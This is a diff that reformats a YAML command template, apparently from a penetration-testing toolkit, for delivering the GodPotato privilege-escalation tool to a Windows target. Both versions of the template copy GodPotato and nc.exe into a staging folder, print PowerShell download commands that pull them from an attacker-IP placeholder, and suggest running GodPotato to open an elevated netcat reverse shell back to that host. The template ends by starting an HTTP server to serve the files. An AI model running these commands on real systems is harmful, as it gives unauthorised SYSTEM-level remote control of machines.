@@ -1,20 +1,18 @@
+---
 metadata:
-  filename: deliver-windows-GodPotato.yaml
-  tags:
-  - windows
-  - privesc
-  created: '2025-03-29'
-  author: Unknown
-content: "mkdir -p packstation/outbound; cp -n {{ tools_dir }}/godpotato/* /usr/share/windows-resources/binaries/nc.exe\
-  \ packstation/outbound/; \\\necho '================================================================';\
-  \ \\\necho '                      -----PowerShell-----                      '; \\\
-  \necho 'Preparation 1 (deliver nc.exe): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
-  \ }}/nc.exe -Outfile {{ delivery_path_windows }}\\nc.exe'; \\\necho 'Deliver (NET4):\
-  \ iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/GodPotato-NET4.exe\
-  \ -Outfile {{ delivery_path_windows }}\\GodPotato.exe'; \\\necho '================================================================';\
-  \ \\\necho '                      -Suggested Commands-                      '; \\\
-  \necho 'To open another revshell with elevated privileges: {{ delivery_path_windows\
-  \ }}\\GodPotato.exe -cmd \"{{ delivery_path_windows }}\\nc.exe -e cmd.exe {{ attacker_ip\
-  \ }} {{ shell_port }}\"'; \\\necho '================================================================';\
-  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
-  \ delivery_outbound_port }} -d packstation/outbound\n"
+  filename: "deliver-windows-GodPotato.yaml"
+  tags: ["windows", "privesc"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/godpotato/* /usr/share/windows-resources/binaries/nc.exe packstation/outbound/; \
+  echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'Preparation 1 (deliver nc.exe): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/nc.exe -Outfile {{ delivery_path_windows }}\nc.exe'; \
+  echo 'Deliver (NET4): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/GodPotato-NET4.exe -Outfile {{ delivery_path_windows }}\GodPotato.exe'; \
+  echo '================================================================'; \
+  echo '                      -Suggested Commands-                      '; \
+  echo 'To open another revshell with elevated privileges: {{ delivery_path_windows }}\GodPotato.exe -cmd "{{ delivery_path_windows }}\nc.exe -e cmd.exe {{ attacker_ip }} {{ shell_port }}"'; \
+  echo '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
